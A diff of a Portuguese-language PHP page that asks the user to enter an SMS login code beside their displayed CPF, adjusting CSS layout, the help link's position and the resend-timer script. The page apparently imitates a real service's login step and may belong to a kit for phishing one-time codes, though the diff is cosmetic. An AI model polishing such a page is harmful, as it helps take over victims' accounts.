@@ -33,35 +33,34 @@ function formatarCPF($cpf) {
         .main-header img { height: 37px; }
         .main-content { padding-top: 80px; flex-grow: 1; }
         .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
-        .left-column { width: 340px; flex-shrink: 0; }
+        
+        /* AJUSTE: Garante o alinhamento à esquerda de todo o conteúdo da coluna */
+        .left-column { width: 340px; flex-shrink: 0; text-align: left; }
+
         .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; }
         .main-title { font-size: 28px; font-weight: 400; margin: 8px 0 16px 0; }
         .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin-bottom: 24px; }
-        .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 25px; padding: 8px 12px; }
+        .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 25px; padding: 8px 12px; margin-bottom: 24px; }
         .user-info-box .icon { width: 32px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .user-info-box .details span { display: block; font-size: 14px; }
         .user-info-box .details a { font-size: 12px; color: var(--cor-azul); text-decoration: none; }
         
-        /* AJUSTE: Link movido para fora da coluna, centralizado */
-        .help-link-container { text-align: left; margin-top: 32px; }
-        .help-link { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; }
-
-        /* --- ESTILOS DO CARD DA DIREITA AJUSTADOS --- */
-        .form-card {
-            background-color: var(--cor-card);
-            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
-            border-radius: 6px;
-            /* AJUSTE: Mais largo e mais compacto */
-            padding: 24px 32px;
-            width: 420px;
-            box-sizing: border-box;
+        /* --- CONTROLE DE POSIÇÃO DO LINK "Preciso de ajuda" --- */
+        .help-link {
+            color: var(--cor-azul);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block; /* Necessário para aplicar margem corretamente */
+            /* Altere o valor abaixo para controlar a distância do box de usuário */
+            margin-top: 24px; 
         }
+
+        .form-card { background-color: var(--cor-card); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 24px 32px; width: 420px; box-sizing: border-box; }
         .form-card label { font-size: 16px; color: var(--cor-texto-primaria); }
         .code-inputs { display: flex; gap: 8px; justify-content: center; margin: 16px 0; }
-        /* AJUSTE: Inputs e seus containers menores */
         .code-inputs input { width: 40px; height: 50px; text-align: center; font-size: 22px; border: 1px solid var(--cor-borda); border-radius: 6px; }
         .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
-        /* AJUSTE: Alinhamento e estilo do timer/link de reenvio */
         .resend-timer { text-align: left; font-size: 14px; color: var(--cor-texto-secundaria); margin: 16px 0 24px 0; min-height: 21px; }
         .resend-timer a { color: var(--cor-azul); text-decoration: none; font-weight: 500; }
         .actions { display: flex; gap: 24px; align-items: center; }
@@ -78,6 +77,7 @@ function formatarCPF($cpf) {
 
     <main class="main-content">
         <div class="content-wrapper">
+            
             <div class="left-column">
                 <span class="session-start-label">INÍCIO DE SESSÃO</span>
                 <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
@@ -85,16 +85,15 @@ function formatarCPF($cpf) {
 
                 <div class="user-info-box">
                     <div class="icon">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                            <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                        </svg>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                     </div>
                     <div class="details">
                         <span><?php echo $tipo_identificador . ': ' . formatarCPF($identificador_cliente); ?></span>
                         <a href="#">Trocar conta</a>
                     </div>
                 </div>
+
+                <a href="#" class="help-link">Preciso de ajuda</a>
             </div>
 
             <div class="form-card">
@@ -116,10 +115,6 @@ function formatarCPF($cpf) {
                 </form>
             </div>
         </div>
-
-        <div class="help-link-container">
-            <a href="#" class="help-link">Preciso de ajuda</a>
-        </div>
     </main>
 
     <script>
@@ -128,7 +123,6 @@ function formatarCPF($cpf) {
         const timerElement = document.querySelector('.resend-timer');
         let countdownInterval;
 
-        // Lógica para pular campos e apagar
         inputs.forEach((input, index) => {
             input.addEventListener('input', () => {
                 if (input.value && index < inputs.length - 1) { inputs[index + 1].focus(); }
@@ -138,10 +132,9 @@ function formatarCPF($cpf) {
             });
         });
 
-        // --- NOVA LÓGICA DE TIMER E REENVIO ---
         function startTimer() {
-            let seconds = 50; // Inicia em 50 segundos
-            timerElement.style.color = 'var(--cor-texto-secundaria)'; // Garante cor padrão
+            let seconds = 50;
+            timerElement.style.color = 'var(--cor-texto-secundaria)';
             
             function updateTimer() {
                 const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
@@ -156,22 +149,19 @@ function formatarCPF($cpf) {
                 }
             }
             
-            clearInterval(countdownInterval); // Limpa qualquer timer anterior
-            updateTimer(); // Chama imediatamente para não esperar 1s para exibir
+            clearInterval(countdownInterval);
+            updateTimer();
             countdownInterval = setInterval(updateTimer, 1000);
         }
 
         function resendSms(event) {
-            event.preventDefault(); // Impede que o link navegue
-            alert('Um novo código seria enviado!'); // Simula ação de reenvio
-            // Aqui você chamaria a API para reenviar o SMS
-            startTimer(); // Reinicia o contador
+            event.preventDefault();
+            alert('Um novo código seria enviado!');
+            startTimer();
         }
 
-        // Inicia o timer quando a página carrega
         document.addEventListener('DOMContentLoaded', startTimer);
         
-        // --- Lógica de submissão do formulário ---
         async function handleFormSubmit(event) {
             event.preventDefault();
             const code = inputs.map(input => input.value).join('');
